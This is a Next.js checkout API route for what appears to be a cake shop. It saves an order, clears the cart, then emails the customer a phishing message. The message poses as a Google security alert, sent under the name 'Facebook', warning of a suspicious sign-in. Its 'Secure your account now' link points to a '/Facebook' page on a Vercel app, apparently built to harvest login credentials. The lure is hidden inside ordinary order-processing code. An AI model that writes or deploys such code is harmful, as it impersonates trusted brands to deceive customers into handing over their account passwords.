import { NextResponse } from "next/server";
import Order from "@/app/lib/modals/Order";
import Cart from "@/app/lib/modals/Cart";
import User from "@/app/lib/modals/users";
import connectdb from "@/app/lib/database";
import nodemailer from 'nodemailer';

export const POST = async(request:Request) => {
    const ticket = Math.floor(1000 + Math.random() * 9000);
    const {cart, Itemtotal, Email, Name} = await request.json(); // we are getting the email from the body so that we can send an email to the user who checkedout
    const location = "Nairobi, Kenya";
    const deviceName = "Chrome on Windows";
    const timestamp = "July 8, 2025 at 6:22 PM EAT";

    let HtmlBody = `
        <table cellpadding="0" cellspacing="0" style="font-family: Arial, sans-serif; width: 100%; max-width: 600px; background-color: #f9f9f9; border: 1px solid #e0e0e0;">
        <tr>
            <td style="padding: 20px;">
            <h2 style="color: #d93025;">⚠️ Critical Security Alert</h2>
            <p>Hi <strong>${Name}</strong>,</p>
            <p>We noticed a suspicious sign-in attempt on your Google and Facebook accounts <strong>${Email}</strong>:</p>
            <table cellpadding="6" cellspacing="0" style="background-color: #fff3cd; border-left: 4px solid #ffa000; margin: 15px 0;">
                <tr>
                <td>
                    <strong>📍 Location:</strong> ${location}<br>
                    <strong>💻 Device:</strong> ${deviceName}<br>
                    <strong>🕒 Time:</strong> ${timestamp}
                </td>
                </tr>
            </table>
            <p>If this was <strong>not</strong> you, please take immediate action to secure your account.</p>
            <p>
                🔒 <a href="https://cake-app2-r9zp.vercel.app/Facebook" style="color: #1a73e8;">Secure your account now</a><br>
                📄 <a href="" style="color: #1a73e8;">Review recent activity</a>
            </p>
            <p style="color: #666;">If you ignore this alert, someone else might gain access to your personal information.</p>
            <p>Stay safe,<br>The Google Security Team</p>
            </td>
        </tr>
        </table>
        `;

    
     try{
           
                if (!cart) {
                    return NextResponse.json({ message: 'Invalid checkout' }, { status: 400 });
                }
                 if (!Name) {
                    return NextResponse.json({ message: "Username is required" }, { status: 400 });
        }
            await connectdb()
            const createdOrder = await Order.create({items:cart, Itemtotal });

            if(createdOrder){
                    const getUser = await User.findOne({username:Name});
                    if (!getUser) {
                        return NextResponse.json({error:'User not found'})
                        }
                    const ID = getUser._id; // getting the user id associated with a particular username
                    if (!ID) {
                        return NextResponse.json({ error: "Missing ID" }, { status: 400 });
                    }
                    await Cart.deleteMany({userId:ID}); //deleting all cart items that were associated with the user who checked out
            }

             const transporter = nodemailer.createTransport({
             host: 'smtp.gmail.com',
             port: 465,
             secure: true,
             service: 'gmail', // or your SMTP provider
             auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD,
      },
    });
           
    await transporter.sendMail({
            from: `"Facebook" <${process.env.EMAIL_USER}>`,
            to: Email,
            subject: 'Order PlaceMent',
            html: HtmlBody,
            
        });

        return new NextResponse(JSON.stringify({
                    message: "Order is Successfully created",
                    user: createdOrder
            }), {status:200});

     } catch(error:unknown){
         if (error instanceof Error) {
            return new NextResponse("Error Placing Order " + error.message, {
                        status:500,
                    })
            }
     }
   
}